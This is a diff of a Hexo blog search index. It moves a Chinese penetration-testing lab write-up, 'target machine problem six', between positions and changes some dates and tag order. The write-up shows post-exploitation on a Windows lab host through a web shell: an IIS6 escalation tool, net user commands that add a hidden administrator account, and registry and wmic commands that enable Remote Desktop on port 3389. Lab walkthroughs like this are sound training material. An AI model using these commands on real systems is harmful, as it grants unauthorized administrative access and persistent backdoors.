@@ -1,60 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>靶机第六题</title>
-    <url>/2019/12/22/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E5%85%AD%E9%A2%98/</url>
-    <content><![CDATA[<h2 id="靶机第六题"><a href="#靶机第六题" class="headerlink" title="靶机第六题"></a>靶机第六题</h2><p>前面已经提到了 我们已经菜刀进去了，结果发现C盘没有权限进去</p>
-<p>那么cmd就没有用，因为cmd在C盘</p>
-<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 增加用户失败.png" alt=""></p>
-<p>于是我们上传了一个CMD.EXE文件</p>
-<p>然后重新进入</p>
-<p><code>net user 123 123 /add</code></p>
-<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 增加用户还失败.png" alt=""></p>
-<p>于是再上传了一个IIS6.EXE</p>
-<p><code>iis6.exe &quot;net user 123 123 /add&quot;</code></p>
-<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 增加用户成功.png" alt=""></p>
-<p>上图告诉我们增加用户123 成功</p>
-<p>然后查看一下用户权限</p>
-<p><code>iis6.exe &quot;net user 123&quot;</code></p>
-<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 查看权限.png" alt=""></p>
-<p>上图反应了我们的123用户还是普通用户，我们需要给予管理员权限</p>
-<p><code>iis6.exe  &quot;net localgroup administrators 123 /add&quot;</code></p>
-<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 增加权限.png" alt=""></p>
-<p>现在我们看看端口，看看服务，这个计算机开了一些什么在跑</p>
-<p><code>iis6.exe  &quot;tasklist -svc&quot;</code></p>
-<p><code>iis6.exe  &quot;netstat -ano&quot;</code></p>
-<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 查看服务.png" alt=""></p>
-<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 查看端口.png" alt=""></p>
-<p>发现开了远程，假如没开，我们就帮他开，代码在后面</p>
-<p>我们直接连接远程</p>
-<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 远程界面.png" alt=""></p>
-<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><h4 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h4><h5 id="新建隐藏用户"><a href="#新建隐藏用户" class="headerlink" title="新建隐藏用户"></a>新建隐藏用户</h5><p>net user liuwx$ 123456 /add<br>net localgroup administrators liuwx$ /add</p>
-<h5 id="如何查看隐藏用户"><a href="#如何查看隐藏用户" class="headerlink" title="如何查看隐藏用户"></a>如何查看隐藏用户</h5><p>regedit打开注册表<br>可以看到，在HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names下有我们所有的用户名</p>
-<h5 id="设置远程桌面端口"><a href="#设置远程桌面端口" class="headerlink" title="设置远程桌面端口"></a>设置远程桌面端口</h5><p>reg add “HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /t REG_DWORD /v portnumber /d 3389 /f </p>
-<h5 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h5><p>wmic RDTOGGLE WHERE ServerName=’%COMPUTERNAME%’ call SetAllowTSConnections 1 </p>
-<h1 id="检查端口状态"><a href="#检查端口状态" class="headerlink" title="检查端口状态"></a>检查端口状态</h1><p>netstat -an|find “3389” </p>
-<h1 id="关闭远程桌面"><a href="#关闭远程桌面" class="headerlink" title="关闭远程桌面"></a>关闭远程桌面</h1><p>wmic RDTOGGLE WHERE ServerName=’%COMPUTERNAME%’ call SetAllowTSConnections 0</p>
-<h5 id="新建用户"><a href="#新建用户" class="headerlink" title="新建用户"></a>新建用户</h5><p>net user username password /add #添加用户<br>net user 123 123 /add<br>net user username #查看用户的详情<br>net user 123<br>net localgroup group username /add #将用户添加到group中<br>net localgroup administrators 123 /add</p>
-<h5 id="方法一：开启3389端口。"><a href="#方法一：开启3389端口。" class="headerlink" title="方法一：开启3389端口。"></a>方法一：开启3389端口。</h5><p>echo Windows Registry Editor Version 5.00&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg<br>echo “fDenyTSConnections”=dword:00000000&gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg<br>echo “PortNumber”=dword:00000d3d&gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg<br>echo “PortNumber”=dword:00000d3d&gt;&gt;3389.reg<br>regedit /s 3389.reg<br>del 3389.reg</p>
-<p>将以上内容拷贝到文本文档内，将后缀名改为.bat格式，双击运行，即可开启3389端口。</p>
-<h5 id="方法二：开启和关闭3389端口"><a href="#方法二：开启和关闭3389端口" class="headerlink" title="方法二：开启和关闭3389端口"></a>方法二：开启和关闭3389端口</h5><p>1）开启3389端口：</p>
-<p>在cmd内，执行如下命令，即可开启3389端口。</p>
-<p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p>
-<p>2）关闭3389端口：</p>
-<p>在cmd内，执行如下命令，即可关闭3389端口。</p>
-<p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>靶机第五题</title>
-    <url>/2019/12/21/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E4%BA%94%E9%A2%98/</url>
+    <url>/2019/12/20/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E4%BA%94%E9%A2%98/</url>
     <content><![CDATA[<h2 id="靶机第五题"><a href="#靶机第五题" class="headerlink" title="靶机第五题"></a>靶机第五题</h2><p>先用第四题中获得的cookie进入</p>
 <p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第五题 修改cookie.png" alt="cookie进入"></p>
 <p>进入后台管理系统，然后先逛一逛，看看有没有可以上传图片或者文件的地方</p>
@@ -110,6 +58,58 @@
       <tags>
         <tag>渗透</tag>
         <tag>cookie</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>靶机第六题</title>
+    <url>/2019/12/20/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E5%85%AD%E9%A2%98/</url>
+    <content><![CDATA[<h2 id="靶机第六题"><a href="#靶机第六题" class="headerlink" title="靶机第六题"></a>靶机第六题</h2><p>前面已经提到了 我们已经菜刀进去了，结果发现C盘没有权限进去</p>
+<p>那么cmd就没有用，因为cmd在C盘</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 增加用户失败.png" alt=""></p>
+<p>于是我们上传了一个CMD.EXE文件</p>
+<p>然后重新进入</p>
+<p><code>net user 123 123 /add</code></p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 增加用户还失败.png" alt=""></p>
+<p>于是再上传了一个IIS6.EXE</p>
+<p><code>iis6.exe &quot;net user 123 123 /add&quot;</code></p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 增加用户成功.png" alt=""></p>
+<p>上图告诉我们增加用户123 成功</p>
+<p>然后查看一下用户权限</p>
+<p><code>iis6.exe &quot;net user 123&quot;</code></p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 查看权限.png" alt=""></p>
+<p>上图反应了我们的123用户还是普通用户，我们需要给予管理员权限</p>
+<p><code>iis6.exe  &quot;net localgroup administrators 123 /add&quot;</code></p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 增加权限.png" alt=""></p>
+<p>现在我们看看端口，看看服务，这个计算机开了一些什么在跑</p>
+<p><code>iis6.exe  &quot;tasklist -svc&quot;</code></p>
+<p><code>iis6.exe  &quot;netstat -ano&quot;</code></p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 查看服务.png" alt=""></p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 查看端口.png" alt=""></p>
+<p>发现开了远程，假如没开，我们就帮他开，代码在后面</p>
+<p>我们直接连接远程</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 远程界面.png" alt=""></p>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><h4 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h4><h5 id="新建隐藏用户"><a href="#新建隐藏用户" class="headerlink" title="新建隐藏用户"></a>新建隐藏用户</h5><p>net user liuwx$ 123456 /add<br>net localgroup administrators liuwx$ /add</p>
+<h5 id="如何查看隐藏用户"><a href="#如何查看隐藏用户" class="headerlink" title="如何查看隐藏用户"></a>如何查看隐藏用户</h5><p>regedit打开注册表<br>可以看到，在HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names下有我们所有的用户名</p>
+<h5 id="设置远程桌面端口"><a href="#设置远程桌面端口" class="headerlink" title="设置远程桌面端口"></a>设置远程桌面端口</h5><p>reg add “HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /t REG_DWORD /v portnumber /d 3389 /f </p>
+<h5 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h5><p>wmic RDTOGGLE WHERE ServerName=’%COMPUTERNAME%’ call SetAllowTSConnections 1 </p>
+<h1 id="检查端口状态"><a href="#检查端口状态" class="headerlink" title="检查端口状态"></a>检查端口状态</h1><p>netstat -an|find “3389” </p>
+<h1 id="关闭远程桌面"><a href="#关闭远程桌面" class="headerlink" title="关闭远程桌面"></a>关闭远程桌面</h1><p>wmic RDTOGGLE WHERE ServerName=’%COMPUTERNAME%’ call SetAllowTSConnections 0</p>
+<h5 id="新建用户"><a href="#新建用户" class="headerlink" title="新建用户"></a>新建用户</h5><p>net user username password /add #添加用户<br>net user 123 123 /add<br>net user username #查看用户的详情<br>net user 123<br>net localgroup group username /add #将用户添加到group中<br>net localgroup administrators 123 /add</p>
+<h5 id="方法一：开启3389端口。"><a href="#方法一：开启3389端口。" class="headerlink" title="方法一：开启3389端口。"></a>方法一：开启3389端口。</h5><p>echo Windows Registry Editor Version 5.00&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg<br>echo “fDenyTSConnections”=dword:00000000&gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg<br>echo “PortNumber”=dword:00000d3d&gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg<br>echo “PortNumber”=dword:00000d3d&gt;&gt;3389.reg<br>regedit /s 3389.reg<br>del 3389.reg</p>
+<p>将以上内容拷贝到文本文档内，将后缀名改为.bat格式，双击运行，即可开启3389端口。</p>
+<h5 id="方法二：开启和关闭3389端口"><a href="#方法二：开启和关闭3389端口" class="headerlink" title="方法二：开启和关闭3389端口"></a>方法二：开启和关闭3389端口</h5><p>1）开启3389端口：</p>
+<p>在cmd内，执行如下命令，即可开启3389端口。</p>
+<p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p>
+<p>2）关闭3389端口：</p>
+<p>在cmd内，执行如下命令，即可关闭3389端口。</p>
+<p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>提权</tag>
       </tags>
   </entry>
   <entry>
@@ -687,8 +687,8 @@
         <category>吃饭</category>
       </categories>
       <tags>
-        <tag>burp</tag>
         <tag>渗透</tag>
+        <tag>burp</tag>
       </tags>
   </entry>
   <entry>
